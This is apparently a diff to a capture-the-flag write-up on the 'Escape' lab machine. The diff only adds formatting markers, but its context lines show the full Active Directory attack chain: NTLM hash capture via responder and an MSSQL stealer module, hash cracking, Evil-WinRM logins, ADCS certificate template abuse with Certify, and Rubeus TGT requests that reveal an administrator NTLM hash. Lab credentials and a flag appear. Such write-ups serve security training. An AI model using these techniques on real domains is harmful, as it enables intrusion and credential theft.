@@ -87,6 +87,7 @@ Host script results:
 |_  start_date: N/A
 |_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
 ```
+{: .nolineno}
 
 ## SMB Enumeration ⤵️
 
@@ -148,6 +149,7 @@ msdb
 
 SQL> 
 ```
+{: .nolineno}
 
 Lets perform NTLM relay attack →
 
@@ -168,6 +170,7 @@ sudo responder -I tun0
 sudo impacket-smbserver share ./ -smb2support
 msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
 ```
+{: .nolineno}
 
 Lets crack the hash now →
 
@@ -183,12 +186,15 @@ REGGIE1234ronnie (sql_svc)
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed.
 ```
+{: .nolineno}
 
 I got this credentials :
 
 ```
+{: .nolineno}
 sql_svc : REGGIE1234ronnie
 ```
+{: .nolineno}
 
 I checked the services and I have winrm access →
 
@@ -224,6 +230,7 @@ C:.
 \---Videos
 *Evil-WinRM* PS C:\Users\sql_svc>
 ```
+{: .nolineno}
 
 I checked the `SQLServer` Directory in `C:` →
 
@@ -256,6 +263,7 @@ Mode                LastWriteTime         Length Name
 ...
 ...
 ```
+{: .nolineno}
 
 ![Untitled](Escape%20d6e1790a7bbc474fbb0247a54be14a7b/Untitled%204.png)
 
@@ -305,6 +313,7 @@ C:.
 \---Videos
 *Evil-WinRM* PS C:\Users\Ryan.Cooper>
 ```
+{: .nolineno}
 
 I guess I should look into `ADCS (Active Directory Certificate Authority)` :
 
@@ -400,6 +409,7 @@ Info: Upload successful!
 Certify completed in 00:00:26.1459663
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
 ```
+{: .nolineno}
 
 Now for finding the vulnerability I used this command :
 
@@ -475,6 +485,7 @@ Now for finding the vulnerability I used this command :
 Certify completed in 00:00:09.6999614
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
 ```
+{: .nolineno}
 
 Since Enrollment Permissions for Domain Users get affected and Template Name UserAuthentication is vulnerable →
 
@@ -483,6 +494,7 @@ Since Enrollment Permissions for Domain Users get affected and Template Name Use
 ```powershell
 Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
 ```
+{: .nolineno}
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
@@ -581,6 +593,7 @@ EJOFy3QlqCe3PGNJFqBt6kXdC9Y6qw==
 Certify completed in 00:00:13.6939714
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
 ```
+{: .nolineno}
 
 Lets save the `cert.pem` content from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` in our attacker machine .
 
@@ -592,6 +605,7 @@ Now I have to convert the `.pem` file into `.pfx` file so for that I will use `o
 Enter Export Password:
 Verifying - Enter Export Password:
 ```
+{: .nolineno}
 
 Now the cert.pfx certificate file will be use to get a TGT as administrator and will be ran through  `Rubeus` with `asktgt`  command :
 
@@ -658,6 +672,7 @@ Now the cert.pfx certificate file will be use to get a TGT as administrator and 
 
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
 ```
+{: .nolineno}
 
 It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter administrator’s folders and get the flag. However, this doesn’t work over Evil-WinRM.
 
@@ -708,6 +723,7 @@ So I used some more flags in rubeus for complete information exposer `/getcreden
        NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
 ```
+{: .nolineno}
 
 Now I got the Administrators NTLM hash so lets have a shell →
 
@@ -771,5 +787,6 @@ C:.
 e4bd13809a4e52f7f5373a704a205e20
 *Evil-WinRM* PS C:\Users\Administrator>
 ```
+{: .nolineno}
 
 I am Administrator Now !!
